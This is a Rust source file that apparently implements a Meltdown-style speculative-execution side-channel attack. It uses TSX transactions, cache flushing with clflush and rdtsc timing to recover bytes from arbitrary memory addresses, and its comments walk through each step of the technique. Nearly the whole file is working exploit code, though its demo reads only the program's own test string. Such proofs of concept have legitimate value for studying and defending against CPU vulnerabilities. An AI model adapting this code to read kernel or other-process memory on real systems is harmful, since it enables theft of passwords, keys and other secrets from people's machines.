#![feature(alloc, allocator_api, heap_api)]
#![feature(asm)]
#![feature(core_intrinsics)]
#![feature(never_type)]
#![feature(pointer_methods)]
#![feature(iterator_step_by)]

extern crate alloc;
extern crate llvmint;
extern crate page_size;
extern crate x86;

use BeginResult::*;

use llvmint::x86::xend;

use alloc::heap::{Alloc, Heap, Layout};
use std::cmp::min;
use std::mem::{transmute, uninitialized};
use std::sync::atomic::fence;
use std::sync::atomic::Ordering::*;

#[repr(u32)]
#[derive(Copy, Clone, PartialEq, Eq)]
#[allow(unused)]
enum BeginResult {
    XBeginStarted = !(0 as u32),
    XAbortExplicit = 1 << 0,
    XAbortRetry = 1 << 1,
    XAbortConflict = 1 << 2,
    XAbortCapacity = 1 << 3,
    XAbortDebug = 1 << 4,
    XAbortNested = 1 << 5,
}

const CHUNK_SIZE: usize = 8;
const LINE_LEN: usize = 32;
const PAGE_SIZE: usize = 4096;

#[inline(always)]
unsafe fn xbegin() -> BeginResult {
    transmute(llvmint::x86::xbegin())
}

// flushes the cache line pointed to by adrs
#[inline(always)]
unsafe fn flush(adrs: *const u8) {
    asm!(
            "mfence; \
             clflush 0($0)"
            :: "r" (adrs)
            :: "volatile"
        );
}

// ensure the buffer we probe is completely out of cache
#[inline(always)]
unsafe fn flush_probe_buf(buf: *const u8) {
    for i in 0..256 {
        flush(buf.add(i * PAGE_SIZE))
    }
}

#[inline(always)]
fn time<F: FnOnce()>(f: F) -> u64 {
    fence(SeqCst);
    let start_time = unsafe { x86::current::time::rdtsc() } as u64;
    unsafe { asm!("lfence"::::"volatile") };
    f();
    let result = unsafe { x86::current::time::rdtscp() as u64 - start_time };
    result
}

// returns an elapsed time for accessing a memory location
#[inline(always)]
unsafe fn probe(adrs: *const u8) -> u64 {
    // fences to prevent out of order execution
    // rdtsc to get a timestamp and store it in time_start
    time(#[inline(always)]
    || {
        adrs.read_volatile();
    })
}

// To determine the value of some arbitrary memory address
// 1. Allocate a huge buffer, and flush it from the cache
// 2. start a speculative execution, which enables unpriviledged access to all memory
// 3. read that byte from memory and use the value to bring a line into the cache that you control
// 4. end speculative execution, it's not committed and the results are discarded, except for cache effects
// 5. time probing the cache lines to see which one was brought into the cache
// 6. the cache line with the shortest time to access corresponds to the value of the byte
#[inline(always)]
unsafe fn guess_byte_once(secret: *const u8, buf: *const u8) -> u8 {
    flush_probe_buf(buf);

    // start speculative execution
    if xbegin() == XBeginStarted {
        // bring a location in buf into the cache based on the value of *secret
        buf.add(secret.read_volatile() as usize * PAGE_SIZE)
            .read_volatile();

        xend();
    } else {
        fence(SeqCst);
    }

    // time how long it takes to read the first cache line of each page of buf
    let mut times: [u64; 256] = uninitialized();
    for i in 0..256 {
        times[i] = probe(buf.add(i * PAGE_SIZE))
    }

    // the index with the smallest time is likely the value of *secret
    times
        .iter()
        .enumerate()
        .min_by_key(|&(_, item)| item)
        .unwrap()
        .0 as u8
}

// read a byte from an arbitrary address
#[inline(never)]
unsafe fn guess_byte(secret: *const u8, buf: *const u8) -> u8 {
    const PROBE_COUNT: usize = 5;
    let mut hit_counts: [usize; 256] = [0; 256];

    // probe multiple times to increase the likelihood that
    // we have determined the correct value of *secret
    for _ in 0..PROBE_COUNT {
        // the index with the smallest time is likely the value of *secret
        // so increase the hit count on that value in our tests buf
        hit_counts[guess_byte_once(secret, buf) as usize] += 1
    }

    // the value with the largest hit count is likely the value of *secret
    hit_counts
        .iter()
        .enumerate()
        .max_by_key(|&(_, &item)| item)
        .unwrap()
        .0 as u8
}

#[inline]
fn human_readable(byte: u8) -> char {
    if byte >= ' ' as u8 && byte <= '~' as u8 {
        byte as char
    } else {
        '.'
    }
}

#[inline(never)]
fn dump_hex(addr: *const u8, s: &[u8]) {
    assert!(s.len() <= LINE_LEN);

    print!("0x{:016X} | ", addr as usize);
    for chunk in s.chunks(CHUNK_SIZE) {
        for byte in chunk {
            print!("{:02X}", byte)
        }
        print!(" ")
    }
    let remainder = LINE_LEN - s.len();
    for _ in 0..remainder {
        print!("  ");
    }
    for _ in 0..remainder / 8 {
        print!(" ");
    }
    print!("| ");
    for &byte in s {
        print!("{}", human_readable(byte))
    }
    println!("");
}

fn main() {
    assert_eq!(page_size::get(), PAGE_SIZE);

    static TEST: &'static str = "papa, can you hear me?";
    let start_addr = TEST.as_ptr();
    let len = TEST.len();

    let poke_buf = unsafe {
        Heap.alloc(Layout::from_size_align_unchecked(
            256 * PAGE_SIZE,
            PAGE_SIZE,
        ))
    }.unwrap();

    println!(
        "poke buffer: 0x{:016X}, page size: {}",
        poke_buf as usize, PAGE_SIZE
    );

    for chunk_start in (0..len).step_by(LINE_LEN) {
        let bytes_to_read = min(len - chunk_start, LINE_LEN);
        let mut s: [u8; LINE_LEN] = unsafe { uninitialized() };
        for x in 0..bytes_to_read {
            s[x] = unsafe { guess_byte(start_addr.add(chunk_start + x), poke_buf) }
        }
        dump_hex(unsafe { start_addr.add(chunk_start) }, &s[..bytes_to_read])
    }
}
